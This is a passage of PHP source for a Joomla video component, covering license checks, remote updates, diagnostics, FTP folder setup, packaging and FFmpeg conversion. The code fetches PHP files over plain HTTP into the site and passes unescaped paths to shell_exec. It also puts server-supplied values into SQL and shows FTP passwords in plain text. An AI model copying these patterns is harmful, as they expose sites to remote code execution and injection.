		$profilegetname=str_replace( ".php", "", $profilename );
		$profile=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/".$profilename;
		$servergetfile="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=updateprophpnew&profilen=".$profilegetname."&pfileno=".$i."&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&sc1=".$securitycode1."&sc2=".$securitycode2;
		download($servergetfile, $profile, $downloadertype);	
	
	}
		

	$keysdate=seyretfindit($keys, "date");				

	if ($jholicphpdate==$keysdate){

		$database->setQuery("UPDATE #__seyret_check SET prophpdate='$jholicphpdate'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}	
	} else {

		$database->setQuery("UPDATE #__seyret_check SET dfltdownloader=''");			 
		if (!$database->query()){
				echo "hata";
			}	

			
		echo "<div style=\"text-align:center; font-size:16px; color:#90A8AB; font-weight:bold; padding:30px; margin:30px; border:4px solid #AB000F; background-color:#FFFEEE; font-family:Tahoma;\">"._PROUPDATEERROR."</div>$keysdate";
		exit;
	}

	
	

	
if ($return=="intro"){
	mosRedirect( "index2.php?option=com_seyret");
} else {
	mosRedirect( "index2.php?option=com_seyret&task=donation");
}
	
	
	
}






function generaterandom ($length)
{

  $randomstart ="";
  $possible = "0123456789abcdefghijklmnopqrstuwxyz"; 
  $i = 0; 
  while ($i < $length) { 
    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
    if (!strstr($randomstart, $char)) { 
      $randomstart .= $char;
      $i++;
    }
  }
return $randomstart;
}

function diagnostics(){
HTML_seyret::htmldiagnostics();
}



function checkfilesystem(){
global $mosConfig_live_site, $mosConfig_absolute_path;
require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php');  

$sessuser="";
$problemstatus="";
$needsfix=0;
$problems=0;


$filelist=array();
$filelist[]="seyretfiles";
$filelist[]="seyretfiles/cache";
$filelist[]="seyretfiles/cache/dl";
$filelist[]="seyretfiles/cache/pro";
$filelist[]="seyretfiles/cache/tmp";
$filelist[]="seyretfiles/cache/rpl";
$filelist[]="seyretfiles/images";
$filelist[]="seyretfiles/uploads";
$filelist[]="seyretfiles/uploads/thumbnails";
$filelist[]="seyretfiles/uploads/videos";
$filelist[]="seyretfiles/localvideos";
$filelist[]="seyretfiles/ads";
$filelist[]="seyretfiles/ads/videoads";
$filelist[]="administrator/components/com_seyret";
$filelist[]="administrator/components/com_seyret/cache";
$filelist[]="administrator/components/com_seyret/cache/html";

$missingimage="<img src=\"$mosConfig_live_site/administrator/components/com_seyret/images/missing.png\" alt=\"\"/>";
$noproblemimage="<img src=\"$mosConfig_live_site/administrator/components/com_seyret/images/noproblem.png\" alt=\"\"/>";
$problemimage="<img src=\"$mosConfig_live_site/administrator/components/com_seyret/images/problem.png\" alt=\"\"/>";

createdirs();

$filesystemreturn="<table width=\"100%\" border=\"0\" class=\"seyretfileinfotable\">";



if (function_exists("posix_getpwuid")){
	$sessuser=posix_getuid();
	$userinfo = posix_getpwuid($sessuser);
	$sessusername=$userinfo['name'];
} else {
	$sessusername="";
}





$filesystemreturn.="<tr><th colspan=\"4\">SESSION USER NAME : <font color=\"green\">".$sessusername."</font></th></tr>";		
$filesystemreturn.="<tr><th>"._DIRECTORY."</th><th align=\"center\">"._OWNER."</th><th align=\"center\">"._ACCESS."</th><th align=\"center\">"._RESULT."</th></tr>";	

		
$rootseyretfiledir=$mosConfig_absolute_path;
$sfile=new seyret_file;


	
foreach ($filelist as $checkfile){
	$sfile->jhfile($mosConfig_absolute_path, $checkfile);
	if ($sfile->fileexists=="yes") {
		$fileaddr=$sfile->filefulladdress;
		$statusimage=$noproblemimage;
	} else {
		$fileaddr="<font color=\"purple\">".$sfile->filefulladdress." - "._MISSING."</font>";
		$statusimage=$missingimage;
		$sfile->permissions="";
		$sfile->permissionsstring="";
		$sfile->fileownername="";
		$sfile->fileownerid="";
		
		$needsfix=1;
	}
	
	if ($sessuser==$sfile->fileownerid){
		$ownerinfo="<font color=\"green\">".$sfile->fileownername."<br/>".$sfile->fileownerid."</font>";
	} else {
	
		if ($needsfix<>1){
			$ownerinfo="<font color=\"orange\">".$sfile->fileownername."<br/>".$sfile->fileownerid."</font>";
			$statusimage=$problemimage;
			$problems=1;
		}

	}

	$filesystemreturn.="<tr><td>".$fileaddr."</td><td style=\"text-align:center;\">".$ownerinfo."</td><td style=\"text-align:center;\">".$sfile->permissions."<br/>".$sfile->permissionsstring."</td><td width=\"1%\">$statusimage</td></tr>";
}

if ($problems==1) $problemstatus.="<div style=\"background-color:#FCF7DB; font-weight:bold;\">".$problemimage." "._TEHERAREOWNERSHIPPROBLEMS."</div>";
if ($needsfix==1) $problemstatus.="<div style=\"background-color:#F7D7E5; font-weight:bold;\">".$missingimage." "._THEREAREMISSINGFILES."</div>";
if ($needsfix==0 AND $problems==0) $problemstatus.="<div style=\"background-color:#D9F2D2; font-weight:bold;\">".$noproblemimage." "._THEREARENOPROBLEMS."</div>";



$filesystemreturn.="<tr><td colspan=\"4\">$problemstatus</td></tr></table>";


if ($needsfix==1){
$filesystemreturn.="
<form action=\"index2.php\" method=\"post\" name=\"adminForm\">


<input type=\"hidden\" name=\"option\" value=\"com_seyret\" />
<input type=\"hidden\" name=\"task\" value=\"ftpcreatelayerdirs\" />


	<table cellpadding=\"4\" cellspacing=\"0\" border=\"0\" width=\"100%\" class=\"seyretfileinfotable\">
		
		<tr>
			<td width=\"100%\" colspan=\"3\">
					<table width=\"100%\">
						<tr>
						<th width=\"100%\">"._NEEDFTP_LAYER."</th>
						</tr>
					</table>
			</td>
		</tr>
	
	<tr>
		<td width=\"20%\"><b>"._FTPSERVER.":</b></td>
		<td width=\"30%\"><input type=\"text\" name=\"ftpserver\" size=\"40\" class=\"inputbox\" value=\"\"></td>
		<td>"._FTPSERVERINFO."</td>
	</tr>
	
	<tr>
		<td width=\"20%\"><b>"._FTPUSERNAME.":</b></td>
		<td width=\"30%\"><input type=\"text\" name=\"ftpusername\" size=\"40\" class=\"inputbox\" value=\"\"></td>
		<td>"._FTPUSERNAMEINFO."</td>
	</tr>	

	<tr>
		<td width=\"20%\"><b>"._FTPPASSWORD.":</b></td>
		<td width=\"30%\"><input type=\"text\" name=\"ftppassword\" size=\"40\" class=\"inputbox\" value=\"\"></td>
		<td>"._FTPPASSWORDINFO."</td>
	</tr>		

	<tr>
		<td width=\"20%\"><b>"._JOOMLAROOT.":</b></td>
		<td width=\"30%\"><input type=\"text\" name=\"joomlaroot\" size=\"40\" class=\"inputbox\" value=\"\"></td>
		<td>"._JOOMLAROOTINFO."</td>
	</tr>	
	
	<tr>	
		<td colspan=\"3\"><button type=\"submit\">"._TRYFTP."</button>
		</td>
	
	</tr>
	
</form>
";




}


return $filesystemreturn;
}




if (!function_exists('ftp_chmod')) {
    function ftp_chmod($ftp_stream, $mode, $filename)
    {
        return ftp_site($ftp_stream, sprintf('CHMOD %o %s', $mode, $filename));
    }
}


function ftpcreatelayerdirs(){
global $mosConfig_absolute_path;


$ftp_server = mosGetParam( $_POST, 'ftpserver', null);
$ftp_user_name = mosGetParam( $_POST, 'ftpusername', null);
$ftp_user_pass = mosGetParam( $_POST, 'ftppassword', null);
$yourjoomlaroot = mosGetParam( $_POST, 'joomlaroot', null);


$dir = $yourjoomlaroot."/seyretfiles";

$conn_id = ftp_connect($ftp_server) or die("Couldn't connect to $ftp_server"); ;

$login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);
ftp_mkdir($conn_id, $dir);
ftp_chmod($conn_id, 0777, $dir);
ftp_close($conn_id);

createdirs();

	
$conn_id = ftp_connect($ftp_server) or die("Couldn't connect to $ftp_server"); ;
$login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);
ftp_mkdir($conn_id, $dir);
ftp_chmod($conn_id, 0755, $dir);	
ftp_close($conn_id);


mosRedirect( "index2.php?option=com_seyret&task=diagnostics");
}




function createdirs(){
global $mosConfig_absolute_path;

$foldersarray=array();
$foldersarray[]="/seyretfiles";
$foldersarray[]="/seyretfiles/cache";
$foldersarray[]="/seyretfiles/cache/dl";
$foldersarray[]="/seyretfiles/cache/pro";
$foldersarray[]="/seyretfiles/cache/rpl";
$foldersarray[]="/seyretfiles/cache/tmp";
$foldersarray[]="/seyretfiles/images";
$foldersarray[]="/seyretfiles/uploads";
$foldersarray[]="/seyretfiles/uploads/thumbnails";
$foldersarray[]="/seyretfiles/uploads/videos";
$foldersarray[]="/seyretfiles/localvideos";
$foldersarray[]="/seyretfiles/ads";
$foldersarray[]="/seyretfiles/ads/videoads";
$foldersarray[]="/seyretfiles/tools";
$foldersarray[]="/seyretfiles/tools/converter";
$foldersarray[]="/administrator/components/com_seyret/cache";
$foldersarray[]="/administrator/components/com_seyret/cache/html";

$file=$mosConfig_absolute_path."/libraries/joomla/filesystem/folder.php";

if (file_exists($file)) {

	jimport('joomla.filesystem.folder');
	

	foreach ($foldersarray as $folder) {
		$folder=$mosConfig_absolute_path.$folder;
		JFolder::create($folder); 

	}



} else {

	foreach ($foldersarray as $folder) {

	$makedir=$mosConfig_absolute_path.$folder;
	if (!is_dir($makedir))
		{
		$oldumask=umask(0);
		mkdir ($makedir,0755);
		umask($oldumask);

		}

	}


}




	




	
	
}




function checkconnection(){

$curldisabled=0;
$allowurldisabled=0;
$allowurlresult=0;
$curlresult="";
$googleconnect=1;

$link="http://www.google.com";
$str=fetchURL($link, true);



$pos = strpos($str, "connectionerror");
if ($pos>0) $googleconnect=0;
					
					
					


	$disabledfunctions="disabledfunctions ".ini_get('disable_functions');
	$pos=strpos($disabledfunctions, "curl_exec");
	if ($pos>0) $curldisabled=1;
	$pos=strpos($disabledfunctions, "allow_url_fopen");	
	if ($pos>0) $allowurldisabled=1;

	$allowurlvalue=ini_get('allow_url_fopen');

//----------------------------------	
	if ($allowurlvalue=="1") {
		$allowurlv="<font color=\"green\">"._ON."</font>";
	} else {
		$allowurlv="<font color=\"red\">"._OFF."</font>";
	}

	if ($allowurldisabled<>1) {
		$allowurldis="<font color=\"green\">"._ENABLED."</font>";
	} else {
		$allowurldis="<font color=\"red\">"._DISABLED."</font>";
	}
	
	if ($allowurlvalue=="1" AND $allowurldis<>1) $allowurlresult=1;
//----------------------------------	
	
	if (function_exists('curl_init')){
		$curlf="<font color=\"green\">"._INSTALLED."</font>";
	} else {
		$curlf="<font color=\"red\">"._NOTINSTALLED."</font>";
	}	

	
	if ($curldisabled<>1) {
		$curldis="";
		if (function_exists('curl_init')) $curldis="<font color=\"green\">"._ENABLED."</font>";
	} else {
		$curldis="<font color=\"red\">"._DISABLED."</font>";
	}

	if (function_exists('curl_init') AND $curldis<>1) $curlresult=1;	
//----------------------------------	
	
	if ($allowurlresult==1 OR $curlresult==1) {
		$seyfstat="<font color=\"green\">"._PASSED."</font>";
	} else {
		$seyfstat="<font color=\"red\">"._FAILED."</font>";
	}

	if ($googleconnect==1) {
		$ggl="<font color=\"green\">"._CONNECTED."</font>";
	} else {
		$ggl="<font color=\"red\">"._FAILED."</font>";
	}	
	
	
	$connectioncheck="
		<table border=\"0\">
			<tr><td>"._ALLOWURLVALUE." : </td><td>$allowurlv</td><td>$allowurldis</td></tr>
			<tr><td>"._CURLLIB." : </td><td>$curlf</td><td>$curldis</td></tr>
			<tr><td>"._SEYRETFUNCSTATUS." : </td><td colspan=\"2\">$seyfstat</td></tr>
			<tr><td>"._GOOGLECONNECTCHECK." : </td><td>$ggl</td><td>"._GOOGLECONNECTCHECKINFO."</td></tr>
		</table>";
	

	
	
	
return $connectioncheck;

}



function clearcache(){
global $mosConfig_absolute_path;
full_rmdir($mosConfig_absolute_path."/seyretfiles/cache");
  
  
mosRedirect( "index2.php?option=com_seyret&task=diagnostics", $cachemessage);
}


function full_rmdir($dirname){
        if ($dirHandle = opendir($dirname)){
            $old_cwd = getcwd();
            chdir($dirname);

            while ($file = readdir($dirHandle)){
                if ($file == '.' || $file == '..') continue;

                if (is_dir($file)){
						full_rmdir($file);
					 
                }else{
                    if (!unlink($file)) return false;
                }
            }

            closedir($dirHandle);
            chdir($old_cwd);
			
			if (!rmdir($dirname)) return false;

            return true;
        }else{
            return false;
        }

}

	
	
function procheck($joomlaalemuserid, $prophpdate, $securitycode1, $securitycode2){

global $mosConfig_live_site, $mosConfig_absolute_path, $database;

											$promessage="<approved>0</approved>
<definitions>notpro</definitions>";	
					
					$siteforjoomlaalem=$mosConfig_live_site;
					$siteforjoomlaalem = str_replace( "www.", "", $siteforjoomlaalem );
					$siteforjoomlaalem = str_replace( "https://", "http://", $siteforjoomlaalem );
					$siteforjoomlaalem = str_replace( ".", "__", $siteforjoomlaalem );
					$siteforjoomlaalem = str_replace( "/", "25ja25", $siteforjoomlaalem );
					$siteforjoomlaalem = str_replace( ":", "1twodots1", $siteforjoomlaalem );
					$link="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=checkpro&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&sc1=".$securitycode1."&sc2=".$securitycode2;
					$str=jalem_file_get_contents($link);
		
					$pos = strpos($str, "<procheck>")+10;
					$post=strpos($str, "</procheck>")-$pos;		
					$procheck=substr($str,$pos,$post);
					
					if ($post<1) $promessage="<approved>connerr</approved>
<definitions>notpro</definitions>";
					
					$pos = strpos($str, "<scneed>")+8;
					$post=strpos($str, "</scneed>")-$pos;		
					$scneed=substr($str,$pos,$post);
					
					$pos = strpos($str, "<jhprophpdate>")+14;
					$post=strpos($str, "</jhprophpdate>")-$pos;		
					$jholicphpdate=substr($str,$pos,$post);
					$pro_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/spphp.php";
					$pro_file_bak=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/spphp.bak";
					

					
					if ($procheck=="rejected") {
						$database->setQuery("UPDATE #__seyret_check SET seyretpro='0'");
						if (!$database->query()){
							echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
							exit();
						}
					
						@full_rmdir($mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro");

					} else if ($procheck=="approved") {
						if ($securitycode1==""){
							$pos = strpos($str, "<sc1>")+5;
							$post=strpos($str, "</sc1>")-$pos;		
							$sc1=substr($str,$pos,$post);
							
							
							$database->setQuery("UPDATE #__seyret_check SET securitycode1='$sc1'");
							if (!$database->query()){
								echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
								exit();
							}							
						}


					
						$database->setQuery("UPDATE #__seyret_check SET seyretpro='1'");
						if (!$database->query()){
							echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
							exit();
						}
						
						
					
						$localdate=strtotime($prophpdate);
						$jholicdate=strtotime($jholicphpdate);
						$siteforjoomlaalem = str_replace( "https://", "http://", $mosConfig_live_site );
						$sitemd5=md5(str_replace( "www.", "", $siteforjoomlaalem));
						$check_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/".$sitemd5.".xml";

						if ($localdate!=$jholicdate OR !file_exists($check_file) OR !file_exists($pro_file)) {
							$promessage="<approved>1</approved>
<definitions>outdated</definitions>";	
						} else {
						$promessage="<approved>1</approved>
<definitions>uptodate</definitions>";	
						}
						
						
					
					}
					

					
					if ($scneed=="yes" AND $procheck=="approved") {
					$promessage="<approved>sec</approved>
<definitions>notpro</definitions>";
					
						$database->setQuery("UPDATE #__seyret_check SET seyretpro='0'");
						if (!$database->query()){
							echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
							exit();
						}					
					}

		$keys="";
		$siteforjoomlaalem = str_replace( "https://", "http://", $mosConfig_live_site );
		$sitemd5=md5(str_replace( "www.", "", $siteforjoomlaalem));
		$check_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/".$sitemd5.".xml";
		$pro_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/spphp.php";
		$pfmd5=@md5_file($pro_file);
			if (file_exists($check_file)){
				$cache_file = fopen( $check_file, "r" );
				while (!feof($cache_file)) {
					$buffer = fgets($cache_file, 1024);
					$keys .= $buffer;
				}
				fclose ($cache_file);		
			}		
			$pos = strpos($keys, "<key3>")+6;
			$post=strpos($keys, "</key3>")-$pos;
			$key3=substr($keys,$pos,$post);					
		
		// if ($key3!=$pfmd5 AND $mosConfig_live_site!="http://localhost/edit"){
			// @unlink($pro_file);
			// @unlink($check_file);	
			// echo "<div style=\"text-align:center; font-size:16px; color:#90A8AB; font-weight:bold; padding:30px; margin:30px; border:4px solid #AB000F; background-color:#FFFEEE; font-family:Tahoma;\">Corrupted pro file, please refresh the page.</div>";

		// exit;
		// }
				
return 	$promessage;		
				
}





function fetchURL($url, $body = false) {
    $url_parsed = parse_url($url);
    $host = $url_parsed["host"];
    if (!isset($url_parsed["port"])) {
        $port = 80;
    }
    else {
        $port = $url_parsed["port"];
    }
    @$path = $url_parsed["path"];
    if (isset($url_parsed["query"])) $path .= "?" . $url_parsed["query"];
    $out = "GET $path HTTP/1.1\r\n" .
           "Host: $host\r\n" .
           "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1\r\n" .
           "Connection: close\r\n\r\n";
    $fp = @fsockopen(gethostbyname($host), $port, $errno, $errstr, 5);
	if (!$fp) {
		return "seyretconnectionerror";
	} else {
	    fwrite($fp, $out);
	    $in = "";
	    while (!feof($fp)) {
	        $s = fgets($fp, 1024);
	        if ($body) $in .= $s;
	        if ($s == "\r\n") $body = true;
	    }
	    fclose($fp);
	    return $in;
	
	}
}



//Function:jalemseyret_read_file->start ***************************
function jalemseyret_read_file( $file, $defaultfile='' ) {

	// open the HTML file and read it into $html
	if (file_exists( $file )) {
		$html_file = fopen( $file, "r" );
	}
	elseif( !empty( $defaultfile ) && file_exists( $defaultfile ) ) {
		$html_file = fopen( $defaultfile, "r" );
	}
	else {
		return;
	}
	$html = "";

	while (!feof($html_file)) {
		$buffer = fgets($html_file, 1024);
		$html .= $buffer;
	}
	fclose ($html_file);

	return $html;
}
//Function:jalemseyret_read_file->end ***************************





function termsofuse(){
global $mosConfig_absolute_path, $mosConfig_live_site;

$termsfile=$mosConfig_absolute_path."/administrator/components/com_seyret/seyrettos.html";
$terms=jalemseyret_read_file($termsfile);

?>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td style="border:solid 1px #1F6A9D;"><div align="center">
      <p>&nbsp;</p>
      <p><?php echo _TERMSOFUSEINFO;?></p>
      <p>&nbsp;</p>
    </div></td>
  </tr>
  <tr>
    <td bgcolor="#1F6A9D" style="color: #FFFFFF!important; padding:5px;"><div align="center"><strong><span><?php echo _TERMSOFUSE;?></span></strong></div></td>

  </tr>
  <tr>
    <td valign="top" style="border:solid 1px #1F6A9D;">
		<div align="center">
			<div style="width: 700px; border:1px solid #CCCCCC; margin:10px; text-align:left; padding:10px; height:250px; overflow:auto; overflow-x:hidden; overflow-y:auto;">
			<?php echo $terms;?>
			</div>
			
			<div style="width: 700px; border:1px solid #CCCCCC; margin:10px; text-align:left; padding:10px; height:50px; overflow:auto; overflow-x:hidden; overflow-y:auto;">
			<h3 style="color:#990000;"><b>Player License</b></h3>
			The <b>JW Players</b> are licensed under a Creative Commons license. It allows you to use, modify and redistribute the script for noncommercial purposes. For all other use, buy a commercial license.<br>You must buy a commercial license if:<br>

   1. Your site has any ads (AdSense, display banners, etc.)<br>
   2. You want to remove the players' attribution (eliminate the right-click link)<br>
   3. You are a corporation (governmental or nonprofit use is free)<br>
   
   To buy a license, please visit <a href="http://www.jeroenwijering.com/?page=order" target="_blank">http://www.jeroenwijering.com/?page=order</a>
			</div>			
			


			
			<div style="width: 700px;">
			<div style=" background-color:#E5FEE9; float:left; width: 300px; border:1px solid #1F992F; margin:10px; text-align:left; padding:10px;"><img src="<?php echo $mosConfig_live_site;?>/administrator/components/com_seyret/images/trackingyes.png" border="0">
			<a href="<?php echo $mosConfig_live_site."/administrator/index2.php?option=com_seyret&task=iaccepttermsofuse";?>" style="color:#008011;"><?php echo _ACCEPTTERMSOFUSE;?></a>
			</div>
			
			<div style=" background-color:#FFE7EA; float:right; width: 300px; border:1px solid #FF7287; margin:10px; text-align:left; padding:10px;"><img src="<?php echo $mosConfig_live_site;?>/administrator/components/com_seyret/images/trackingno.png" border="0">
			<a href="<?php echo $mosConfig_live_site."/administrator/index2.php?option=com_seyret&task=idenytermsofuse";?>" style="color:#B0001A;"><?php echo _DENYTERMSOFUSE;?></a>	
			</div>
			</div>
		</div>
	</td>
  
  </tr>
</table>


<?php
}


function iaccepttermsofuse(){
global $database;
$database->setQuery("UPDATE #__seyret_check SET accepttermsofuse='1'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	} 

	mosRedirect( "index2.php?option=com_seyret");
	
}

function idenytermsofuse(){
global $mosConfig_absolute_path, $mosConfig_live_site;


?>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td style="border:solid 1px #1F6A9D;"><div align="center">
      <p>&nbsp;</p>
      <p><?php echo _DENYCONFIRMINFO;?></p>
      <p>&nbsp;</p>
    </div></td>
  </tr>
  <tr>
    <td bgcolor="#1F6A9D" style="color: #FFFFFF!important; padding:5px;"><div align="center"><strong><span><?php echo _DENYCONFIRM;?></span></strong></div></td>

  </tr>
  <tr>
    <td valign="top" style="border:solid 1px #1F6A9D;">
		<div align="center">
			
			<div style="width: 700px;">
			<div style=" background-color:#FFFDD5; float:left; width: 300px; border:1px solid #BAB000; margin:10px; text-align:left; padding:10px;"><img src="<?php echo $mosConfig_live_site;?>/administrator/components/com_seyret/images/reload.png" border="0">
			<a href="<?php echo $mosConfig_live_site."/administrator/index2.php?option=com_seyret";?>" style="color:#008011;"><?php echo _ILLREADTERMSAGAIN;?></a>
			</div>
			
			<div style=" background-color:#FFE7EA; float:right; width: 300px; border:1px solid #FF7287; margin:10px; text-align:left; padding:10px;"><img src="<?php echo $mosConfig_live_site;?>/administrator/components/com_seyret/images/reset.png" border="0">
			<a href="<?php echo $mosConfig_live_site."/administrator/index2.php?option=com_seyret&task=proceeduninstall";?>" style="color:#B0001A;"><?php echo _ILLUNINSTALL;?></a>	
			</div>
			</div>
		</div>
	</td>
  
  </tr>
</table>


<?php
}



function seyretfindit($keys,$tag){

		$opentag="<".$tag.">";
		$closetag="</".$tag.">";
		$length=strlen($opentag)-1;
		$pos = strpos($keys, $tag)+$length;
		$post=strpos($keys, $closetag)-$pos;
		$value=substr($keys,$pos,$post);		
		
		return $value;

}







function packme(){
global $mosConfig_absolute_path;
require($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_version.php");

$vers=str_replace( ".", "_", $seyretversion );
$vers=str_replace( "_zip", ".zip", $vers );

$packagingdir=$mosConfig_absolute_path."/com_seyret_".$vers;
if (!is_dir($packagingdir))
	{
	$oldumask=umask(0);
	mkdir ($packagingdir,0755);
	umask($oldumask);
	}
				
				
$admindir=$mosConfig_absolute_path."/administrator/components/com_seyret";
$type="admin";
getfileslist($admindir, $packagingdir, $admindir, $type);

$frontdir=$mosConfig_absolute_path."/components/com_seyret";
$type="front";
getfileslist($frontdir, $packagingdir, $frontdir, $type);

$date=date("m.d.y");
$versionheader="<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>
<mosinstall version=\"1.0.13\" type=\"component\">
    <name>Seyret</name>
    <version>$seyretversion</version>
    <creationDate>$date</creationDate>
    <author>Mustafa Dindar</author>
    <authorEmail>dindarm@gmail.com</authorEmail>
    <authorUrl>http://www.joomlaholic.com</authorUrl>
    <copyright>2008 Mustafa Dindar</copyright>
    <license>GNU General Public License</license>
    <description>Please goto administration panel first</description>";

$xmlfile = $packagingdir."/seyret.xml";	
$frontfileslistf=$packagingdir."/filesfront.php";
$adminfileslistf=$packagingdir."/filesadmin.php";

$frontfileslist=jalemseyret_read_file($frontfileslistf);
$adminfileslist=jalemseyret_read_file($adminfileslistf);

$context=$versionheader."\n    <files>\n".$frontfileslist."\n    </files>\n
    <administration>\n
	<menu>Seyret</menu>
    <files>\n".$adminfileslist."\n   </files>
    </administration>
    <params />
</mosinstall>";

if ( $fp = fopen( $xmlfile, "w" ) ) {
	fwrite( $fp, $context );
	fclose ( $fp );
}

unlink($frontfileslistf);
unlink($adminfileslistf);

echo "Paket hazýr";

}


function packit(){
		HTML_seyret::htmlpackit();

}

function packitprocess(){
global $mosConfig_absolute_path;
require($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_version.php");

$vers=str_replace( ".", "_", $seyretversion );
$vers=str_replace( "_zip", ".zip", $vers );


$targetfolder = mosGetParam($_REQUEST,'targetfolder',null);
$packthisxmlname = mosGetParam($_REQUEST,'packthisxmlname',null);
$type = mosGetParam($_REQUEST,'type',null);
$packagename = mosGetParam($_REQUEST,'packagename',null);
$packageversion = mosGetParam($_REQUEST,'packageversion',null);
$author = mosGetParam($_REQUEST,'author',null);
$authormail = mosGetParam($_REQUEST,'authormail',null);
$authorurl = mosGetParam($_REQUEST,'authorurl',null);
$copyright = mosGetParam($_REQUEST,'copyright',null);
$description = mosGetParam($_REQUEST,'description',null);
$compatibility = mosGetParam($_REQUEST,'compatibility',null);




$packagingdir=$mosConfig_absolute_path."/com_seyret_package_".$packthisxmlname;
if (!is_dir($packagingdir))
	{
	$oldumask=umask(0);
	mkdir ($packagingdir,0755);
	umask($oldumask);
	}
				
				
$packagethisfolder=$mosConfig_absolute_path."/".$targetfolder;
getfileslist($packagethisfolder, $packagingdir, $packagethisfolder, $type);


$date=date("m.d.y");
$versionheader="<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>
<seyretxml>
	<name>$packagename</name>
	<packageversion>$packageversion</packageversion>
	<type>$type</type>
	<date>$date</date>
	<author>$author</author>
	<authorEmail>$authormail</authorEmail>
	<authorUrl>$authorurl</authorUrl>
	<copyright>$copyright</copyright>
	<description>$description</description>
	<targetfolder>$targetfolder</targetfolder>
	<compatibility>$compatibility</compatibility>
	";

$xmlfile = $packagingdir."/".$packthisxmlname.".xml";	
$fileslistf=$packagingdir."/files".$type.".php";

$fileslist=jalemseyret_read_file($fileslistf);

$xmlexist=$packagethisfolder."/".$packthisxmlname.".xml";

$addxml="";
if (!file_exists($xmlexist)){
$addxml="		     <filename>".$packthisxmlname.".xml</filename>";

}

$context=$versionheader."
	<files>
$addxml
".$fileslist."
	</files>
</seyretxml>";

if ( $fp = fopen( $xmlfile, "w" ) ) {
	fwrite( $fp, $context );
	fclose ( $fp );
}


unlink($fileslistf);
echo "Paket hazýr";

}




function getfileslist($dirname,  $packagingdir, $maindir, $type){
        if ($dirHandle = opendir($dirname)){
            $old_cwd = getcwd();
            chdir($dirname);

            while ($file = readdir($dirHandle)){
                if ($file == '.' || $file == '..' || $file == '.svn' || $file == 'Thumbs.db'|| $file == 'pro' || $file == 'checkfile.php'|| $file == 'cache') continue;

                if (is_dir($file)){
					$file=$dirname."/".$file;
					
					$originaldir=$file;
					$copydir=str_replace( $maindir, $packagingdir, $originaldir );
					if (!is_dir($copydir))
					{
						$oldumask=umask(0);
						mkdir ($copydir,0755);
						umask($oldumask);
						//echo $copydir;
					}				
					
                    if (!getfileslist($file,  $packagingdir, $maindir, $type)) return false;
                }else{
					$myfilename= $file;
					
					$originalfile=$dirname."/".$myfilename;
					$copyfile=str_replace( $maindir, $packagingdir, $originalfile );
					@copy($originalfile, $copyfile);
					// echo "<div style=\"text-align:left;\">";
					// echo $dirname."/".$myfilename;
					// echo "</div>";
						$puredirname=str_replace( $maindir."/", "", $dirname );
						$puredirname=str_replace( $maindir, "", $puredirname );

		
						$log = $packagingdir."/files".$type.".php";	
						$append="            <filename>$puredirname/$myfilename</filename>\n";
						$append=str_replace( "<filename>/", "<filename>", $append );						
						
						if ( $fp = fopen( $log, "a" ) ) {
							fwrite( $fp, $append );
							fclose ( $fp );
						}
                }
            }

            closedir($dirHandle);
			chdir($old_cwd);
            return true;
        }else{
            return false;
        }

}



function clearhtmlcache(){

global $mosConfig_absolute_path;

	$cachedir=strtolower($mosConfig_absolute_path."/administrator/components/com_seyret/cache/html");
	$dir=opendir($cachedir);
	
	while($file=readdir($dir))
	{
		if ($file!="." and $file!=".."){ 
		$del=$cachedir."/".$file;
		//echo $del;
		@chmod ($del, 0766);
		@unlink($del);
		}
	}
	closedir($dir);

}



function convertvideostoflvbatch(){
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	require($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_config.php"); 
	$videobitrate.="kb";
//	$audiobitrate.="kb";
	$ffmpegpreexec=base64_decode($ffmpegpreexec);	
	
			$database->setQuery("SELECT * FROM #__seyret_items WHERE videoservertype='localfile'");
			$vidyo = $database->loadObjectList();
				foreach ($vidyo as $vidyo) {
				$vidid=$vidyo->id;
				$servertype=$vidyo->videoservertype;
				$vcode=$vidyo->videoservercode;
				
				$mosConfig_absolute_path=strtolower($mosConfig_absolute_path);
				$vcode=strtolower($vcode);
				
				$localvidcode=str_replace( $mosConfig_live_site, $mosConfig_absolute_path, $vcode );
				$analyzepath = pathinfo($localvidcode);
				$ext=".".$analyzepath['extension'];

				$outputvcode=str_replace( $ext, ".flv", $localvidcode );
				
				$thumbnailoutput=str_replace( "/uploads/videos/", "/uploads/thumbnails/", $localvidcode ); 
				$thumbnailoutput=str_replace( $ext, ".jpg", $thumbnailoutput );
				
				$execresult=shell_exec("$ffmpegpreexec $ffmpegpath -i $localvidcode -b $videobitrate -r $videoframerate -s $setflvdimensions -ar  $audiosamplingfrequency -ab $audiobitrate -aspect 4:3  -f flv  -acodec libmp3lame $outputvcode");	

